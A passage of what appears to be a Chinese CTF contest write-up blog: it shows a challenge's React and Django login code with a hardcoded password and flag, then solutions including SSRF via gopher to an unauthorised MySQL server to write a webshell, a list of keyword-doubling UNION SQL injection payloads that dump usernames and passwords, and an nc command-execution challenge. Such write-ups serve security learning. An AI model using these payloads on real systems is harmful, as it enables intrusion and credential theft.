class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">"react"</span>;</span><br><span class="line"><span class="keyword">import</span> &#123;</span><br><span class="line">    AppBar,</span><br><span class="line">    createStyles, CssBaseline,</span><br><span class="line">    Drawer, Hidden, IconButton,</span><br><span class="line">    List,</span><br><span class="line">    ListItem,</span><br><span class="line">    ListItemIcon,</span><br><span class="line">    ListItemText, ListSubheader,</span><br><span class="line">    Theme, Toolbar, Typography,</span><br><span class="line">    withStyles</span><br><span class="line">&#125; <span class="keyword">from</span> <span class="string">"@material-ui/core"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> MenuIcon <span class="keyword">from</span> <span class="string">'@material-ui/icons/Menu'</span>;</span><br><span class="line"><span class="keyword">import</span> LiveHelpIcon <span class="keyword">from</span> <span class="string">'@material-ui/icons/LiveHelp'</span>;</span><br><span class="line"><span class="keyword">import</span> ListAltIcon <span class="keyword">from</span> <span class="string">'@material-ui/icons/ListAlt'</span>;</span><br><span class="line"><span class="keyword">import</span> GavelIcon <span class="keyword">from</span> <span class="string">'@material-ui/icons/Gavel'</span>;</span><br><span class="line"><span class="keyword">import</span> HelpIcon <span class="keyword">from</span> <span class="string">'@material-ui/icons/Help'</span>;</span><br><span class="line"><span class="keyword">import</span> EqualizerIcon <span class="keyword">from</span> <span class="string">'@material-ui/icons/Equalizer'</span>;</span><br><span class="line"><span class="keyword">import</span> HomeIcon <span class="keyword">from</span> <span class="string">'@material-ui/icons/Home'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> drawerWidth = <span class="number">200</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> drawerStyle = <span class="function">(<span class="params">theme: Theme</span>) =&gt;</span></span><br><span class="line">        createStyles(&#123;</span><br><span class="line">            root: &#123;</span><br><span class="line">                display: <span class="string">'flex'</span>,</span><br><span class="line">            &#125;,</span><br><span class="line">            drawer: &#123;</span><br><span class="line">                [theme.breakpoints.up(<span class="string">'sm'</span>)]: &#123;</span><br><span class="line">                    width: drawerWidth,</span><br><span class="line">                    flexShrink: <span class="number">0</span>,</span><br><span class="line">                &#125;,</span><br><span class="line">            &#125;,</span><br><span class="line">            menuButton: &#123;</span><br><span class="line">                marginRight: theme.spacing(<span class="number">2</span>),</span><br><span class="line">            &#125;,</span><br><span class="line">            toolbar: theme.mixins.toolbar,</span><br><span class="line">            drawerPaper: &#123;</span><br><span class="line">                marginTop: <span class="number">64</span>,</span><br><span class="line">                width: drawerWidth,</span><br><span class="line">            &#125;,</span><br><span class="line">            content: &#123;</span><br><span class="line">                flexGrow: <span class="number">1</span>,</span><br><span class="line">                padding: theme.spacing(<span class="number">3</span>),</span><br><span class="line">            &#125;,</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">interface State &#123;</span><br><span class="line">    mobileOpen: boolean</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DrawerNav</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span>&lt;<span class="title">any</span>, <span class="title">State</span>&gt; </span>&#123;</span><br><span class="line">    readonly state: Readonly&lt;State&gt; = &#123;</span><br><span class="line">        mobileOpen: <span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    handleDrawerToggle = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.setState(&#123;<span class="attr">mobileOpen</span>: !<span class="keyword">this</span>.state.mobileOpen&#125;)</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    render() &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123;classes&#125; = <span class="keyword">this</span>.props;</span><br><span class="line">        <span class="keyword">const</span> drawer = (</span><br><span class="line">            &lt;div&gt;</span><br><span class="line">                &lt;List</span><br><span class="line">                    subheader=&#123;</span><br><span class="line">                        &lt;ListSubheader component=<span class="string">"div"</span> id=<span class="string">"nested-list-subheader"</span>&gt;</span><br><span class="line">                            Online Judge</span><br><span class="line">                        &lt;<span class="regexp">/ListSubheader&gt;</span></span><br><span class="line"><span class="regexp">                    &#125;&gt;</span></span><br><span class="line"><span class="regexp">                    &lt;ListItem button&gt;</span></span><br><span class="line"><span class="regexp">                        &lt;ListItemIcon&gt;&lt;HomeIcon/</span>&gt;&lt;<span class="regexp">/ListItemIcon&gt;</span></span><br><span class="line"><span class="regexp">                        &lt;ListItemText primary="Home" /</span>&gt;</span><br><span class="line">                    &lt;<span class="regexp">/ListItem&gt;</span></span><br><span class="line"><span class="regexp">                    &lt;ListItem button&gt;</span></span><br><span class="line"><span class="regexp">                        &lt;ListItemIcon&gt;&lt;LiveHelpIcon/</span>&gt;&lt;<span class="regexp">/ListItemIcon&gt;</span></span><br><span class="line"><span class="regexp">                        &lt;ListItemText primary="Problems" /</span>&gt;</span><br><span class="line">                    &lt;<span class="regexp">/ListItem&gt;</span></span><br><span class="line"><span class="regexp">                    &lt;ListItem button&gt;</span></span><br><span class="line"><span class="regexp">                        &lt;ListItemIcon&gt;&lt;ListAltIcon/</span>&gt;&lt;<span class="regexp">/ListItemIcon&gt;</span></span><br><span class="line"><span class="regexp">                        &lt;ListItemText primary="Contests" /</span>&gt;</span><br><span class="line">                    &lt;<span class="regexp">/ListItem&gt;</span></span><br><span class="line"><span class="regexp">                    &lt;ListItem button&gt;</span></span><br><span class="line"><span class="regexp">                        &lt;ListItemIcon&gt;&lt;GavelIcon/</span>&gt;&lt;<span class="regexp">/ListItemIcon&gt;</span></span><br><span class="line"><span class="regexp">                        &lt;ListItemText primary="States" /</span>&gt;</span><br><span class="line">                    &lt;<span class="regexp">/ListItem&gt;</span></span><br><span class="line"><span class="regexp">                    &lt;ListItem button&gt;</span></span><br><span class="line"><span class="regexp">                        &lt;ListItemIcon&gt;&lt;EqualizerIcon/</span>&gt;&lt;<span class="regexp">/ListItemIcon&gt;</span></span><br><span class="line"><span class="regexp">                        &lt;ListItemText primary="Rank" /</span>&gt;</span><br><span class="line">                    &lt;<span class="regexp">/ListItem&gt;</span></span><br><span class="line"><span class="regexp">                    &lt;ListItem button&gt;</span></span><br><span class="line"><span class="regexp">                        &lt;ListItemIcon&gt;&lt;HelpIcon/</span>&gt;&lt;<span class="regexp">/ListItemIcon&gt;</span></span><br><span class="line"><span class="regexp">                        &lt;ListItemText primary="Help" /</span>&gt;</span><br><span class="line">                    &lt;<span class="regexp">/ListItem&gt;</span></span><br><span class="line"><span class="regexp">                &lt;/</span>List&gt;</span><br><span class="line">            &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">        );</span></span><br><span class="line"><span class="regexp">        return (</span></span><br><span class="line"><span class="regexp">            &lt;div className=&#123;classes.root&#125;&gt;</span></span><br><span class="line"><span class="regexp">                &lt;CssBaseline /</span>&gt;</span><br><span class="line">                &lt;AppBar position=<span class="string">"fixed"</span>&gt;</span><br><span class="line">                    &lt;Toolbar&gt;</span><br><span class="line">                        &lt;Hidden smUp&gt;</span><br><span class="line">                            &lt;IconButton</span><br><span class="line">                                color=<span class="string">"inherit"</span></span><br><span class="line">                                aria-label=<span class="string">"open drawer"</span></span><br><span class="line">                                edge=<span class="string">"start"</span></span><br><span class="line">                                onClick=&#123;<span class="keyword">this</span>.handleDrawerToggle&#125;</span><br><span class="line">                                className=&#123;classes.menuButton&#125;</span><br><span class="line">                            &gt;</span><br><span class="line">                                &lt;MenuIcon /&gt;</span><br><span class="line">                            &lt;<span class="regexp">/IconButton&gt;</span></span><br><span class="line"><span class="regexp">                        &lt;/</span>Hidden&gt;</span><br><span class="line"></span><br><span class="line">                        &lt;Hidden xsDown&gt;</span><br><span class="line">                            &lt;IconButton</span><br><span class="line">                                color=<span class="string">"inherit"</span></span><br><span class="line">                                aria-label=<span class="string">"open drawer"</span></span><br><span class="line">                                edge=<span class="string">"start"</span></span><br><span class="line">                                className=&#123;classes.menuButton&#125;</span><br><span class="line">                            &gt;</span><br><span class="line">                                &lt;MenuIcon /&gt;</span><br><span class="line">                            &lt;<span class="regexp">/IconButton&gt;</span></span><br><span class="line"><span class="regexp">                        &lt;/</span>Hidden&gt;</span><br><span class="line"></span><br><span class="line">                        &lt;Typography variant=<span class="string">"h6"</span> noWrap&gt;</span><br><span class="line">                            武科大ACM俱乐部</span><br><span class="line">                        &lt;<span class="regexp">/Typography&gt;</span></span><br><span class="line"><span class="regexp">                    &lt;/</span>Toolbar&gt;</span><br><span class="line">                &lt;<span class="regexp">/AppBar&gt;</span></span><br><span class="line"><span class="regexp">                &lt;nav className=&#123;classes.drawer&#125; aria-label="mailbox folders"&gt;</span></span><br><span class="line"><span class="regexp">                    &lt;Hidden smUp implementation="css"&gt;</span></span><br><span class="line"><span class="regexp">                        &lt;Drawer</span></span><br><span class="line"><span class="regexp">                            variant="temporary"</span></span><br><span class="line"><span class="regexp">                            open=&#123;this.state.mobileOpen&#125;</span></span><br><span class="line"><span class="regexp">                            onClose=&#123;this.handleDrawerToggle&#125;</span></span><br><span class="line"><span class="regexp">                            classes=&#123;&#123;paper: classes.drawerPaper&#125;&#125;</span></span><br><span class="line"><span class="regexp">                            ModalProps=&#123;&#123;keepMounted: true&#125;&#125;</span></span><br><span class="line"><span class="regexp">                        &gt;</span></span><br><span class="line"><span class="regexp">                            &#123;drawer&#125;</span></span><br><span class="line"><span class="regexp">                        &lt;/</span>Drawer&gt;</span><br><span class="line">                    &lt;<span class="regexp">/Hidden&gt;</span></span><br><span class="line"><span class="regexp">                    &lt;Hidden xsDown implementation="css"&gt;</span></span><br><span class="line"><span class="regexp">                        &lt;Drawer</span></span><br><span class="line"><span class="regexp">                            classes=&#123;&#123;paper: classes.drawerPaper&#125;&#125;</span></span><br><span class="line"><span class="regexp">                            variant="permanent"</span></span><br><span class="line"><span class="regexp">                            open</span></span><br><span class="line"><span class="regexp">                        &gt;</span></span><br><span class="line"><span class="regexp">                            &#123;drawer&#125;</span></span><br><span class="line"><span class="regexp">                        &lt;/</span>Drawer&gt;</span><br><span class="line">                    &lt;<span class="regexp">/Hidden&gt;</span></span><br><span class="line"><span class="regexp">                &lt;/</span>nav&gt;</span><br><span class="line">            &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">        );</span></span><br><span class="line"><span class="regexp">    &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">export default withStyles(drawerStyle)(DrawerNav)</span></span><br></pre></td></tr></table></figure>

<h5 id="后端"><a href="#后端" class="headerlink" title="后端"></a>后端</h5><h6 id="views-py"><a href="#views-py" class="headerlink" title="views.py"></a>views.py</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> rest_framework.views <span class="keyword">import</span> APIView</span><br><span class="line"><span class="keyword">from</span> rest_framework.response <span class="keyword">import</span> Response</span><br><span class="line"><span class="keyword">from</span> rest_framework <span class="keyword">import</span> serializers</span><br><span class="line"><span class="keyword">from</span> rest_framework.status <span class="keyword">import</span> HTTP_404_NOT_FOUND</span><br><span class="line"><span class="keyword">from</span> uuid <span class="keyword">import</span> uuid4</span><br><span class="line"><span class="keyword">from</span> .models <span class="keyword">import</span> CaptchaStore, IPStore</span><br><span class="line"><span class="keyword">from</span> .util <span class="keyword">import</span> Captcha</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestSerializers</span><span class="params">(serializers.Serializer)</span>:</span></span><br><span class="line">    uuid = serializers.CharField(required=<span class="literal">True</span>)</span><br><span class="line">    code = serializers.CharField(required=<span class="literal">False</span>, allow_blank=<span class="literal">True</span>)</span><br><span class="line">    password = serializers.CharField(required=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">save</span><span class="params">(self, ip_store)</span>:</span></span><br><span class="line">        attrs = self.validated_data</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            c = CaptchaStore.objects.get(uuid=attrs[<span class="string">"uuid"</span>])</span><br><span class="line">            <span class="keyword">if</span> ip_store.need_captcha() <span class="keyword">and</span> c.data != attrs[<span class="string">"code"</span>]:</span><br><span class="line">                c.delete()</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span>, <span class="string">"验证码错误"</span></span><br><span class="line">            print(attrs[<span class="string">"password"</span>])</span><br><span class="line">            <span class="keyword">if</span> attrs[<span class="string">"password"</span>] != <span class="string">"312"</span>:</span><br><span class="line">                c.delete()</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span>, <span class="string">"密码错误"</span></span><br><span class="line">            c.delete()</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span>, <span class="string">"flag&#123;do_you_like_react_and_webpack&#125;"</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span>, <span class="string">"uuid不存在"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LoginView</span><span class="params">(APIView)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self, request)</span>:</span></span><br><span class="line">        <span class="comment"># IP 检测</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"HTTP_X_REAL_IP"</span> <span class="keyword">in</span> request.META:</span><br><span class="line">            ip = request.META[<span class="string">'HTTP_X_REAL_IP'</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ip = request.META[<span class="string">'REMOTE_ADDR'</span>]</span><br><span class="line">        uuid = str(uuid4()).replace(<span class="string">"-"</span>, <span class="string">""</span>)</span><br><span class="line">        ip_md5 = hashlib.md5(ip.encode()).hexdigest()</span><br><span class="line">        ip_store, _ = IPStore.objects.get_or_create(ip=ip_md5)</span><br><span class="line">        image_str = <span class="string">""</span></span><br><span class="line">        v = <span class="string">"0000"</span></span><br><span class="line">        <span class="keyword">if</span> ip_store.try_num &gt; <span class="number">2</span>:</span><br><span class="line">            image_str, v = Captcha().get()</span><br><span class="line">        CaptchaStore.objects.create(uuid=uuid, data=v)</span><br><span class="line">        uuid_bytes = list(uuid.encode())</span><br><span class="line">        key_byte = list(<span class="string">"123C7E5E875FBF0EEE2583F8AF3DDFF9"</span>.encode())</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(uuid_bytes)):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(len(key_byte)):</span><br><span class="line">                uuid_bytes[i] ^= key_byte[j]</span><br><span class="line">        s = base64.b64encode(bytes(uuid_bytes)).decode()</span><br><span class="line">        <span class="keyword">return</span> Response(&#123;</span><br><span class="line">            <span class="string">"img"</span>: image_str,</span><br><span class="line">            <span class="string">"uuid"</span>: s</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(self, request)</span>:</span></span><br><span class="line">        se = TestSerializers(data=request.data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"HTTP_X_REAL_IP"</span> <span class="keyword">in</span> request.META:</span><br><span class="line">            ip = request.META[<span class="string">'HTTP_X_REAL_IP'</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ip = request.META[<span class="string">'REMOTE_ADDR'</span>]</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            ip_md5 = hashlib.md5(ip.encode()).hexdigest()</span><br><span class="line">            ip_store = IPStore.objects.get(ip=ip_md5)</span><br><span class="line">            ip_store.add_visit_num()</span><br><span class="line">            <span class="keyword">if</span> ip_store.need_ban():</span><br><span class="line">                <span class="keyword">return</span> Response(status=HTTP_404_NOT_FOUND)</span><br><span class="line">            <span class="keyword">if</span> se.is_valid():</span><br><span class="line">                s, data = se.save(ip_store)</span><br><span class="line">                <span class="keyword">return</span> Response(&#123;<span class="string">"result"</span>: s, <span class="string">"msg"</span>: data&#125;)</span><br><span class="line">            <span class="keyword">return</span> Response(&#123;<span class="string">"result"</span>: <span class="literal">False</span>, <span class="string">"msg"</span>: <span class="string">"表单错误"</span>&#125;)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            print(e)</span><br><span class="line">            <span class="keyword">return</span> Response(status=HTTP_404_NOT_FOUND)</span><br></pre></td></tr></table></figure>

<h6 id="utils-py"><a href="#utils-py" class="headerlink" title="utils.py"></a>utils.py</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageDraw, ImageFont</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Captcha</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.random_number = <span class="string">""</span>.join([str(j) <span class="keyword">for</span> j <span class="keyword">in</span> [random.choice(list(range(<span class="number">10</span>))) <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">4</span>)]])</span><br><span class="line">        self.color = [(random.randint(<span class="number">0</span>, <span class="number">255</span>), random.randint(<span class="number">0</span>, <span class="number">255</span>), random.randint(<span class="number">0</span>, <span class="number">255</span>)) <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">4</span>)]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self)</span>:</span></span><br><span class="line">        weight = <span class="number">63</span></span><br><span class="line">        height = <span class="number">24</span></span><br><span class="line">        image = Image.new(<span class="string">'RGB'</span>, (weight, height), (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>))</span><br><span class="line">        font = ImageFont.truetype(font=<span class="string">"C:/309.ttf"</span>, size=<span class="number">25</span>)</span><br><span class="line">        draw = ImageDraw.Draw(image)</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> range(weight):</span><br><span class="line">            <span class="keyword">for</span> y <span class="keyword">in</span> range(height):</span><br><span class="line">                draw.point((x, y), fill=(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>))</span><br><span class="line">        offset = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> number, color <span class="keyword">in</span> zip(self.random_number, self.color):</span><br><span class="line">            draw.text((offset * <span class="number">15</span> + <span class="number">5</span>, <span class="number">0</span>), str(number), font=font, fill=color)</span><br><span class="line">            offset += <span class="number">1</span></span><br><span class="line">        buffered = BytesIO()</span><br><span class="line">        image.save(buffered, format=<span class="string">"PNG"</span>)</span><br><span class="line">        img_str = base64.b64encode(buffered.getvalue()).decode()</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"data:image/png;base64,"</span> + img_str, self.random_number</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    i, n = Captcha().get()</span><br><span class="line">    print(i, n)</span><br></pre></td></tr></table></figure>

<h6 id="models-py"><a href="#models-py" class="headerlink" title="models.py"></a>models.py</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.db <span class="keyword">import</span> models</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CaptchaStore</span><span class="params">(models.Model)</span>:</span></span><br><span class="line">    uuid = models.CharField(max_length=<span class="number">30</span>)</span><br><span class="line">    data = models.CharField(max_length=<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IPStore</span><span class="params">(models.Model)</span>:</span></span><br><span class="line">    ip = models.CharField(max_length=<span class="number">32</span>)</span><br><span class="line">    try_num = models.IntegerField(default=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add_visit_num</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.try_num += <span class="number">1</span></span><br><span class="line">        self.save(update_fields=[<span class="string">"try_num"</span>])</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">need_captcha</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.try_num &gt; <span class="number">3</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">need_ban</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.try_num &gt; <span class="number">50</span></span><br></pre></td></tr></table></figure>



<h3 id="这个跳板怎么样"><a href="#这个跳板怎么样" class="headerlink" title="这个跳板怎么样"></a>这个跳板怎么样</h3><p>主要涉及知识点：</p>
<p>通过SSRF，访问未授权Mysql数据库，写入Webshell</p>
<p>打开网页，F12发现提示”白蜘蛛”，访问robots.txt</p>
<p>拿到有关内网数据库的一些信息（包括账号，库名，表名，字段名）</p>
<p>SSRF访问未授权MySql数据，可以参考这篇文章：</p>
<p><a href="https://blog.csdn.net/qq_41107295/article/details/103026470" target="_blank" rel="noopener">https://blog.csdn.net/qq_41107295/article/details/103026470</a></p>
<p>（主要是通过gopher协议，发送TCP数据）</p>
<p>页面输入一些网站，发现是可以访问的。（ban掉了dict和file）</p>
<p>使用gopher协议直接发送数据包，访问未授权MySql，在hint字段里面查看到网站的根目录信息。</p>
<p>接下来两种思路：</p>
<ol>
<li>直接load_file根目录下的flag文件</li>
<li>通过into outfile向根目录写入webshell，蚁剑访问，拿到flag</li>
</ol>
<h3 id="EasyWeb"><a href="#EasyWeb" class="headerlink" title="EasyWeb"></a>EasyWeb</h3><p>很简单的SQL注入，B站也有视频，不多说</p>
<p>直接上payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">-1&#x2F;**&#x2F;ununionion&#x2F;**&#x2F;seselectlect&#x2F;**&#x2F;1,2,database()# &#x2F;&#x2F;爆库</span><br><span class="line"></span><br><span class="line">-1&#x2F;**&#x2F;ununionion&#x2F;**&#x2F;seselectlect&#x2F;**&#x2F;1,2,group_concat(table_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;inforinformationmation_schema.tables&#x2F;**&#x2F;where&#x2F;**&#x2F;table_schema&#x3D;&#39;exercise&#39;# &#x2F;爆表</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-1&#x2F;**&#x2F;ununionion&#x2F;**&#x2F;seselectlect&#x2F;**&#x2F;1,2,group_concat(column_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;inforinformationmation_schema.columns&#x2F;**&#x2F;where&#x2F;**&#x2F;table_name&#x3D;&#39;users&#39;# 爆字段</span><br><span class="line"></span><br><span class="line">-1&#x2F;**&#x2F;ununionion&#x2F;**&#x2F;seselectlect&#x2F;**&#x2F;1,2,group_concat(username)&#x2F;**&#x2F;from&#x2F;**&#x2F;users# &#x2F;爆值</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-1&#x2F;**&#x2F;ununionion&#x2F;**&#x2F;seselectlect&#x2F;**&#x2F;1,2,group_concat(password)&#x2F;**&#x2F;from&#x2F;**&#x2F;users# &#x2F;爆值</span><br></pre></td></tr></table></figure>



<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="0x00-Command"><a href="#0x00-Command" class="headerlink" title="0x00.Command"></a>0x00.Command</h3><p>​        在Ubuntu终端执行命令来远程运行程序。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 121.41.113.245 10000</span><br></pre></td></tr></table></figure>

<p><img src="https://s1.ax1x.com/2020/07/20/U4w2OP.png" alt=""></p>
<p>​        提示我们输入命令，估计是linux命令。</p>
<p>​        二话不说把文件丢入IDA分析，主函数如下：</p>
<p><img src="https://s1.ax1x.com/2020/07/20/U4w5Fg.png" alt=""></p>
<p>​        程序大意是让用户输入一个字符串，并且将这个字符串当作linux命令执行，因此我们直接执行”/bin/sh”即可控制远程终端，然后再执行cat flag.txt，即可拿到flag值：flag{aa2ff3bc-88e7-4b08-89b0-3e93a445c5d7}</p>
<p><img src="https://s1.ax1x.com/2020/07/20/U4wfw8.png" alt=""></p>
